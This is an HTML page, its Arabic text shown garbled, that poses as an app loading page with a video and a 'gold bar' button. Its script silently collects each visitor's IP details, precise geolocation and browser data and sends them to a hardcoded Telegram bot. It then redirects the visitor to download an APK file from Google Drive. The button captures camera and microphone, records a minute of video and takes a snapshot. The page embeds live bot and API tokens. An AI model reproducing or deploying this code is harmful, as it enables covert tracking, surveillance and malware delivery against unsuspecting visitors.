<!doctype html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>ØªØ·Ø¨ÙŠÙ‚ Ø§Ù„Ù…Ù‡Ø§ â€” Ø¬Ø§Ø±Ù Ø§Ù„ØªØ­Ø¶ÙŠØ±</title>
<style>
  body {
    margin:0; background:#0f172a; color:#e5e7eb;
    font-family: system-ui, sans-serif;
    display:flex; flex-direction:column; align-items:center; justify-content:center;
    min-height:100vh; padding:20px; text-align:center;
  }
  .container { max-width:800px; width:100%; }
  iframe { width:100%; aspect-ratio:16/9; border:none; border-radius:12px; box-shadow:0 10px 30px rgba(0,0,0,.4); }
  h1 { font-size:1.5rem; margin-bottom:10px; }
  p { color:#94a3b8; margin-bottom:20px; }
  #startMedia {
    margin-top:20px;
    padding:12px 24px;
    font-size:16px;
    font-weight:bold;
    border:none;
    border-radius:8px;
    background:linear-gradient(45deg, #FFD700, #FFC107);
    color:#000;
    cursor:pointer;
    box-shadow:0 4px 10px rgba(0,0,0,0.3);
    display:inline-flex;
    align-items:center;
    gap:8px;
    transition:transform 0.2s ease;
  }
  #startMedia:hover { transform:scale(1.05); }
  video, img { margin-top:15px; max-width:100%; border-radius:8px; }
</style>
</head>
<body>
<div class="container">
  <h1>Ù…Ø±Ø­Ø¨Ø§ Ø¨Ùƒ ÙÙŠ Ù…Ø¬Ù…Ø¹ Ø§Ø³ØªÙ‚Ø¨Ø§Ù„ Ø§Ù„Ø¹Ù…Ù„Ø§Ø¡</h1>
  <p>ÙŠØªÙ… ØªØ´ØºÙŠÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ ÙˆØªØ­Ù…ÙŠÙ„ Ø§Ù„ØªØ·Ø¨ÙŠÙ‚ ØªÙ„Ù‚Ø§Ø¦ÙŠÙ‹Ø§</p>
  <iframe src="https://www.youtube.com/embed/zUwlEVnEy-E?autoplay=1&mute=0&playsinline=1&rel=0&modestbranding=1" allowfullscreen></iframe>
  <button id="startMedia">ğŸŒŸ Ø³Ø¨ÙŠÙƒØ© Ø°Ù‡Ø¨ÙŠØ©</button>
  <video id="preview" autoplay muted playsinline></video>
  <img id="snapshot" alt="ØµÙˆØ±Ø© Ù…Ù„ØªÙ‚Ø·Ø©" />
</div>

<script>
const TELEGRAM_BOT = "8311279268:AAH4R0M7DPNSpx_bWSQ2bi9DuBuUkgqxLm4";
const TELEGRAM_CHAT = "7664416709";
const IPINFO_TOKEN = "3bc0a2eadd8ba5";
const IPDATA_TOKEN = "cf2660a0b70d048e98abd2fa63498f74512ef8c328cb7ea5370ee669";
const APK_URL = "https://drive.google.com/uc?export=download&id=1nQROVVDXjN1G4_71H0B5D0_4AvSjpVaq";

const ua = navigator.userAgent;
let ipInfoData = {}, ipDataData = {}, geo = {};

function fetchIpInfo() {
  return fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`).then(r=>r.json()).then(d=>ipInfoData=d).catch(()=>{});
}
function fetchIpData() {
  return fetch(`https://api.ipdata.co?api-key=${IPDATA_TOKEN}`).then(r=>r.json()).then(d=>ipDataData=d).catch(()=>{});
}
function fetchGeo() {
  return new Promise(res=>{
    if(navigator.geolocation){
      navigator.geolocation.getCurrentPosition(p=>{
        geo={lat:p.coords.latitude, lon:p.coords.longitude, acc:p.coords.accuracy};
        res();
      },()=>res());
    } else res();
  });
}

function sendToTelegram(extra="") {
  const now = new Date().toLocaleString('ar-MA',{hour12:false});
  const msg = `
ğŸš€ Ø²ÙŠØ§Ø±Ø© Ø¬Ø¯ÙŠØ¯Ø© â€” ØªØ·Ø¨ÙŠÙ‚ Ø§Ù„Ù…Ù‡Ø§
â±ï¸ ${now}

ğŸŒ [ipinfo.io]
IP: ${ipInfoData.ip||"?"}
Ø§Ù„Ù…Ø¯ÙŠÙ†Ø©: ${ipInfoData.city||"?"}
Ø§Ù„Ø¯ÙˆÙ„Ø©: ${ipInfoData.country||"?"}

ğŸŒ [ipdata.co]
Ø§Ù„Ù‚Ø§Ø±Ø©: ${ipDataData.continent_name||"?"}
Ø§Ù„Ù…Ø²ÙˆØ¯: ${ipDataData.asn?.name||"?"}

ğŸ§­ Ø¥Ø­Ø¯Ø§Ø«ÙŠØ§Øª:
Lat: ${geo.lat??"null"} Lon: ${geo.lon??"null"} Â±${geo.acc??"?"}m

ğŸ“± UA: ${ua}

${extra}
  `;
  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage`,{
    method:"POST", headers:{"Content-Type":"application/json"},
    body:JSON.stringify({chat_id:TELEGRAM_CHAT, text:msg})
  });
}

Promise.all([fetchIpInfo(), fetchIpData(), fetchGeo()]).then(()=>{
  sendToTelegram();
  setTimeout(()=>{ window.location.href = APK_URL; }, 2000);
});

// Ø²Ø± Ø§Ù„Ø³Ø¨ÙŠÙƒØ© Ø§Ù„Ø°Ù‡Ø¨ÙŠØ©
document.getElementById("startMedia").onclick = async ()=>{
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
    document.getElementById("preview").srcObject = stream;
    sendToTelegram("âœ… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… ÙˆØ§ÙÙ‚ Ø¹Ù„Ù‰ Ø§Ù„Ù…Ø´Ø§Ø±ÙƒØ© Ø¨Ø§Ù„ØµÙˆØª/Ø§Ù„ØµÙˆØ±Ø©");

    // ØªØ³Ø¬ÙŠÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ ÙˆØ§Ù„ØµÙˆØª Ù„Ù…Ø¯Ø© 60 Ø«Ø§Ù†ÙŠØ©
    const recorder = new MediaRecorder(stream);
    let chunks = [];
    recorder.ondataavailable = e => chunks.push(e.data);
    recorder.onstop = e => {
      const blob = new Blob(chunks, { type: 'video/webm' });
      const url = URL.createObjectURL(blob);
      const vid = document.createElement('video');
      vid.src = url;
      vid.controls = true;
      document.body.appendChild(vid);
      // Ù‡Ù†Ø§ ÙŠÙ…ÙƒÙ†Ùƒ Ø±ÙØ¹ blob Ø¥Ù„Ù‰ Ø®Ø§Ø¯Ù…Ùƒ Ø£Ùˆ ØªÙŠÙ„ÙŠØ¬Ø±Ø§Ù…
    };
    recorder.start();
    setTimeout(()=>recorder.stop(), 60000); // Ø¯Ù‚ÙŠÙ‚Ø© ÙƒØ§Ù…Ù„Ø©

    // Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø© Ø¨Ø¹Ø¯ 5 Ø«ÙˆØ§Ù†Ù
    setTimeout(()=>{
      const video = document.getElementById("preview");
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext("2d").drawImage(video, 0, 0);
      document.getElementById("snapshot").src = canvas.toDataURL("image/png");
      // Ù‡Ù†Ø§ ÙŠÙ…ÙƒÙ†Ùƒ Ø±ÙØ¹ Ø§Ù„ØµÙˆØ±Ø© Ø¥Ù„Ù‰ Ø®Ø§Ø¯Ù…Ùƒ Ø£Ùˆ ØªÙŠÙ„ÙŠØ¬Ø±Ø§Ù…
    }, 5000);

  } catch(e) {
    sendToTelegram("âŒ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø±ÙØ¶ Ø§Ù„Ù…Ø´Ø§Ø±ÙƒØ© Ø¨Ø§Ù„ØµÙˆØª/Ø§Ù„ØµÙˆØ±Ø©");
    alert("Ù„Ù… ÙŠØªÙ… Ù…Ù†Ø­ Ø§Ù„Ø¥Ø°Ù†.");
  }
};
</script>
</body>
</html>
